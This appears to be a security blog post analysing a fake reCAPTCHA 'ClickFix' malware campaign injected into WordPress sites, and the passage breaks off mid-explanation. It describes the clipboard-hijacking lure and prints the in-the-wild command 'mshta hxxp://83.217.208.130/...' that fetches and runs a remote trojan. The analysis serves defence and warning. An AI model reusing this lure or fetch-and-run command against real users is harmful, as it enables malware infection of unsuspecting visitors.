![WordPress ClickFix Malware](https://blog.sucuri.net/wp-content/uploads/2025/02/WordPress-ClickFix-Malware-820x386.png)

Since December of last year there has been a new fake Google reCAPTCHA campaign making its way through the WordPress world. Very similar to malware which we wrote about last [Summer](https://blog.sucuri.net/2024/08/wordpress-websites-used-to-distribute-clearfake-trojan-malware.html), the website malware injection attempts to trick unsuspecting victims into executing malicious Powershell commands within Windows OS environments with the end goal of infecting their computers.

The malware disguises itself as a fake Google ReCAPTCHA which lodges itself into the home page of the infected website:

![fake recaptcha](https://blog.sucuri.net/wp-content/uploads/2025/02/fake-recaptcha.png)

Since most surfers of the web have probably lost count years ago of the number of times they’ve had to click on all the fire hydrants, motorcycles, or traffic lights to prove they’re not a bot most people probably wouldn’t think twice about clicking through this prompt. However, this website malware initiates a series of malicious prompts to trick the user into infecting their machine.

In this post we’ll go over how the infection works for both the end user as well as the compromised websites on which the malware is hosted, with the end goal of helping web users and site administrators alike improve their security and avoid this malware infection and others like it.

## A Series of Deceitful Prompts

Let’s first review what the website visitors experience when they click through the fake Google reCAPTCHA (this can also help website owners identify that their website has been compromised).

After the initial first click into the fake reCAPTCHA we are met with everyone’s favourite irritating prompt to select all of the images which contain a particular item, in this case a car (even featuring a helpful accessibility tool at the bottom left hand corner):

![fake recaptcha select images](https://blog.sucuri.net/wp-content/uploads/2025/02/fake-recaptcha-select-images.png)

Next, not unlike the previous iterations of this malware, try as we might to complete the human verification prompt it just doesn’t want to accept our inputs:

![fake recaptcha failed human verification](https://blog.sucuri.net/wp-content/uploads/2025/02/fake-recaptcha-failed-human-verification.png)

Ah yes, that pesky unstable network DNS, always causing issues! But what is really going on here?

The malware instructs the user to perform the following tasks:

* Press Windows + R (to open the **Windows Run prompt** to issue commands)
* Press CTRL + V (to paste the contents of the clipboard)
* Press enter

The malware abuses the user clicking/interacting with the web page to automatically insert itself into the user’s clipboard, thereby bypassing the need to manually copy the command (making this process seem more “natural” to the user).

For those of you not aware, asking a user to press **Windows + R** to run a command is a *massive red flag*. It is a technique frequently used by tech support scammers to trick people into running unsafe or downright malicious commands into their machines, bypassing normal security protocols. Most often, running commands like this is reserved for power users and should never be touched by casual web surfers, so if anybody ever asks you to do this, **do not proceed!**

So what exactly is it trying to do here? Let’s take a look at what it copies to the victim’s clipboard.

## Malicious Powershell Command

At the time of investigating this malware the malicious command that the attackers were trying to coax victims into pasting into their Windows command prompt was as follows:

```
mshta hxxp://83.217.208.130/xfiles/Ohio.mp4 # Microsoft Windows: Fix Internet DNS Service reconnect
```

Although at the moment, that fake video file appears to have been removed and they’ve moved onto a new server, it was certainly some sort of trojan application, and certainly not anything to do with fixing internet DNS issues.

The **mshta** command in Windows Powershell is typically used to execute an HTML application (HTA) without the usual ...
